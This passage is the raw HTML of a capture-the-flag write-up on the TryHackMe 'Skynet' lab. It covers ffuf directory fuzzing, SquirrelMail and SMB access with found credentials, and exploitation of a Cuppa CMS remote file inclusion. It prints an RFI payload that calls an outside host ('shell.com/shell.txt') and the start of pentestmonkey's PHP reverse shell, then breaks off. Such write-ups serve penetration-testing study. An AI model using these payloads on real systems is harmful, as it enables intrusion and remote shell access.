&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : http://10.10.34.11/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htaccess &lt;span class="o">[&lt;/span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 69ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htpasswd &lt;span class="o">[&lt;/span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 68ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">admin &lt;span class="o">[&lt;/span>Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 56ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ai &lt;span class="o">[&lt;/span>Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 57ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">config &lt;span class="o">[&lt;/span>Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 58ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">css &lt;span class="o">[&lt;/span>Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 57ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">js &lt;span class="o">[&lt;/span>Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 62ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">server-status &lt;span class="o">[&lt;/span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 333ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">squirrelmail &lt;span class="o">[&lt;/span>Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 56ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">:: Progress: &lt;span class="o">[&lt;/span>20469/20469&lt;span class="o">]&lt;/span> :: Job &lt;span class="o">[&lt;/span>1/1&lt;span class="o">]&lt;/span> :: &lt;span class="m">298&lt;/span> req/sec :: Duration: &lt;span class="o">[&lt;/span>0:00:37&lt;span class="o">]&lt;/span> :: Errors: &lt;span class="m">0&lt;/span> ::
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>The one thing that we want to check is squirrel mail, where we are going to put our username and password that we found before.&lt;/p>
&lt;p>By entering the mail server we see 3 emails, the first is the one interessing for now.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">We have changed your smb password after system malfunction.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password: &amp;lt;redacted&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So that’s why I couldn’t access his share.&lt;/p>
&lt;p>Another thing that we get from this is that we have found the two other accounts, probably skynet is the admin and serenakogan is another user.&lt;/p>
&lt;p>So we go back to samba.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">smbclient //10.10.34.11/milesdyson -U milesdyson
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password &lt;span class="k">for&lt;/span> &lt;span class="o">[&lt;/span>WORKGROUP&lt;span class="se">\m&lt;/span>ilesdyson&lt;span class="o">]&lt;/span>:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Try &lt;span class="s2">&amp;#34;help&amp;#34;&lt;/span> to get a list of possible commands.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">smb: &lt;span class="se">\&amp;gt;&lt;/span> ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> . D &lt;span class="m">0&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:47 &lt;span class="m">2019&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> .. D &lt;span class="m">0&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 23:51:03 &lt;span class="m">2019&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Improving Deep Neural Networks.pdf N &lt;span class="m">5743095&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:14 &lt;span class="m">2019&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Natural Language Processing-Building Sequence Models.pdf N &lt;span class="m">12927230&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:14 &lt;span class="m">2019&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Convolutional Neural Networks-CNN.pdf N &lt;span class="m">19655446&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:14 &lt;span class="m">2019&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> notes D &lt;span class="m">0&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:18:40 &lt;span class="m">2019&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Neural Networks and Deep Learning.pdf N &lt;span class="m">4304586&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:14 &lt;span class="m">2019&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Structuring your Machine Learning Project.pdf N &lt;span class="m">3531427&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:14 &lt;span class="m">2019&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And now we are in.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">smbclient //10.10.34.11/milesdyson -U milesdyson
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password &lt;span class="k">for&lt;/span> &lt;span class="o">[&lt;/span>WORKGROUP&lt;span class="se">\m&lt;/span>ilesdyson&lt;span class="o">]&lt;/span>:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Try &lt;span class="s2">&amp;#34;help&amp;#34;&lt;/span> to get a list of possible commands.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">smb: &lt;span class="se">\&amp;gt;&lt;/span> ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> . D &lt;span class="m">0&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:47 &lt;span class="m">2019&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> .. D &lt;span class="m">0&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 23:51:03 &lt;span class="m">2019&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Improving Deep Neural Networks.pdf N &lt;span class="m">5743095&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:14 &lt;span class="m">2019&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Natural Language Processing-Building Sequence Models.pdf N &lt;span class="m">12927230&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:14 &lt;span class="m">2019&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Convolutional Neural Networks-CNN.pdf N &lt;span class="m">19655446&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:14 &lt;span class="m">2019&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> notes D &lt;span class="m">0&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:18:40 &lt;span class="m">2019&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Neural Networks and Deep Learning.pdf N &lt;span class="m">4304586&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:14 &lt;span class="m">2019&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Structuring your Machine Learning Project.pdf N &lt;span class="m">3531427&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:14 &lt;span class="m">2019&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">9204224&lt;/span> blocks of size 1024. &lt;span class="m">5654060&lt;/span> blocks available
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>As we can see his share is full of useless things, the only thing that is important is the notes folder, from there we can see that it has a txt file named important.txt&lt;/p>
&lt;p>Getting that file will reveal to us a hidden directory inside the web page.&lt;/p>
&lt;p>This directory doesn’t tell us much.&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled%201.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>But one thing that we can do is to FUZZ this.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u http://10.10.34.11/&amp;lt;redacted&amp;gt;/FUZZ -w /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : http://10.10.34.11/&amp;lt;redacted&amp;gt;/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htaccess &lt;span class="o">[&lt;/span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 59ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htpasswd &lt;span class="o">[&lt;/span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4154ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">administrator &lt;span class="o">[&lt;/span>Status: 301, Size: 335, Words: 20, Lines: 10, Duration: 58ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">:: Progress: &lt;span class="o">[&lt;/span>20469/20469&lt;span class="o">]&lt;/span> :: Job &lt;span class="o">[&lt;/span>1/1&lt;span class="o">]&lt;/span> :: &lt;span class="m">338&lt;/span> req/sec :: Duration: &lt;span class="o">[&lt;/span>0:00:39&lt;span class="o">]&lt;/span> :: Errors: &lt;span class="m">0&lt;/span> ::
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And we got another directory, an administrator page.&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled%202.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>After trying some password I decided to searcxh internet for exploits.&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled%203.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>I came accross this, a remote file ionclusion vuln.&lt;/p>
&lt;p>I tested it out and it works.&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled%204.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>Unfortunately with this method we can’t also get the shadow.&lt;/p>
&lt;p>So I tried another FLI listed in here:&lt;/p>
&lt;p>&lt;code>http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?&lt;/code>&lt;/p>
&lt;p>For this to work, I first need to generate a reverse shell:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt"> 10
&lt;/span>&lt;span class="lnt"> 11
&lt;/span>&lt;span class="lnt"> 12
&lt;/span>&lt;span class="lnt"> 13
&lt;/span>&lt;span class="lnt"> 14
&lt;/span>&lt;span class="lnt"> 15
&lt;/span>&lt;span class="lnt"> 16
&lt;/span>&lt;span class="lnt"> 17
&lt;/span>&lt;span class="lnt"> 18
&lt;/span>&lt;span class="lnt"> 19
&lt;/span>&lt;span class="lnt"> 20
&lt;/span>&lt;span class="lnt"> 21
&lt;/span>&lt;span class="lnt"> 22
&lt;/span>&lt;span class="lnt"> 23
&lt;/span>&lt;span class="lnt"> 24
&lt;/span>&lt;span class="lnt"> 25
&lt;/span>&lt;span class="lnt"> 26
&lt;/span>&lt;span class="lnt"> 27
&lt;/span>&lt;span class="lnt"> 28
&lt;/span>&lt;span class="lnt"> 29
&lt;/span>&lt;span class="lnt"> 30
&lt;/span>&lt;span class="lnt"> 31
&lt;/span>&lt;span class="lnt"> 32
&lt;/span>&lt;span class="lnt"> 33
&lt;/span>&lt;span class="lnt"> 34
&lt;/span>&lt;span class="lnt"> 35
&lt;/span>&lt;span class="lnt"> 36
&lt;/span>&lt;span class="lnt"> 37
&lt;/span>&lt;span class="lnt"> 38
&lt;/span>&lt;span class="lnt"> 39
&lt;/span>&lt;span class="lnt"> 40
&lt;/span>&lt;span class="lnt"> 41
&lt;/span>&lt;span class="lnt"> 42
&lt;/span>&lt;span class="lnt"> 43
&lt;/span>&lt;span class="lnt"> 44
&lt;/span>&lt;span class="lnt"> 45
&lt;/span>&lt;span class="lnt"> 46
&lt;/span>&lt;span class="lnt"> 47
&lt;/span>&lt;span class="lnt"> 48
&lt;/span>&lt;span class="lnt"> 49
&lt;/span>&lt;span class="lnt"> 50
&lt;/span>&lt;span class="lnt"> 51
&lt;/span>&lt;span class="lnt"> 52
&lt;/span>&lt;span class="lnt"> 53
&lt;/span>&lt;span class="lnt"> 54
&lt;/span>&lt;span class="lnt"> 55
&lt;/span>&lt;span class="lnt"> 56
&lt;/span>&lt;span class="lnt"> 57
&lt;/span>&lt;span class="lnt"> 58
&lt;/span>&lt;span class="lnt"> 59
&lt;/span>&lt;span class="lnt"> 60
&lt;/span>&lt;span class="lnt"> 61
&lt;/span>&lt;span class="lnt"> 62
&lt;/span>&lt;span class="lnt"> 63
&lt;/span>&lt;span class="lnt"> 64
&lt;/span>&lt;span class="lnt"> 65
&lt;/span>&lt;span class="lnt"> 66
&lt;/span>&lt;span class="lnt"> 67
&lt;/span>&lt;span class="lnt"> 68
&lt;/span>&lt;span class="lnt"> 69
&lt;/span>&lt;span class="lnt"> 70
&lt;/span>&lt;span class="lnt"> 71
&lt;/span>&lt;span class="lnt"> 72
&lt;/span>&lt;span class="lnt"> 73
&lt;/span>&lt;span class="lnt"> 74
&lt;/span>&lt;span class="lnt"> 75
&lt;/span>&lt;span class="lnt"> 76
&lt;/span>&lt;span class="lnt"> 77
&lt;/span>&lt;span class="lnt"> 78
&lt;/span>&lt;span class="lnt"> 79
&lt;/span>&lt;span class="lnt"> 80
&lt;/span>&lt;span class="lnt"> 81
&lt;/span>&lt;span class="lnt"> 82
&lt;/span>&lt;span class="lnt"> 83
&lt;/span>&lt;span class="lnt"> 84
&lt;/span>&lt;span class="lnt"> 85
&lt;/span>&lt;span class="lnt"> 86
&lt;/span>&lt;span class="lnt"> 87
&lt;/span>&lt;span class="lnt"> 88
&lt;/span>&lt;span class="lnt"> 89
&lt;/span>&lt;span class="lnt"> 90
&lt;/span>&lt;span class="lnt"> 91
&lt;/span>&lt;span class="lnt"> 92
&lt;/span>&lt;span class="lnt"> 93
&lt;/span>&lt;span class="lnt"> 94
&lt;/span>&lt;span class="lnt"> 95
&lt;/span>&lt;span class="lnt"> 96
&lt;/span>&lt;span class="lnt"> 97
&lt;/span>&lt;span class="lnt"> 98
&lt;/span>&lt;span class="lnt"> 99
&lt;/span>&lt;span class="lnt">100
&lt;/span>&lt;span class="lnt">101
&lt;/span>&lt;span class="lnt">102
&lt;/span>&lt;span class="lnt">103
&lt;/span>&lt;span class="lnt">104
&lt;/span>&lt;span class="lnt">105
&lt;/span>&lt;span class="lnt">106
&lt;/span>&lt;span class="lnt">107
&lt;/span>&lt;span class="lnt">108
&lt;/span>&lt;span class="lnt">109
&lt;/span>&lt;span class="lnt">110
&lt;/span>&lt;span class="lnt">111
&lt;/span>&lt;span class="lnt">112
&lt;/span>&lt;span class="lnt">113
&lt;/span>&lt;span class="lnt">114
&lt;/span>&lt;span class="lnt">115
&lt;/span>&lt;span class="lnt">116
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&amp;lt;?php
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">// Copyright &lt;span class="o">(&lt;/span>C&lt;span class="o">)&lt;/span> &lt;span class="m">2007&lt;/span> pentestmonkey@pentestmonkey.net
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">set_time_limit &lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$VERSION&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;1.0&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$ip&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;your_ip&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$port&lt;/span> &lt;span class="o">=&lt;/span> 4444&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$chunk_size&lt;/span> &lt;span class="o">=&lt;/span> 1400&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$write_a&lt;/span> &lt;span class="o">=&lt;/span> null&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$error_a&lt;/span> &lt;span class="o">=&lt;/span> null&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$shell&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;uname -a; w; id; /bin/bash -i&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$daemon&lt;/span> &lt;span class="o">=&lt;/span> 0&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$debug&lt;/span> &lt;span class="o">=&lt;/span> 0&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>function_exists&lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;pcntl_fork&amp;#39;&lt;/span>&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$pid&lt;/span> &lt;span class="o">=&lt;/span> pcntl_fork&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
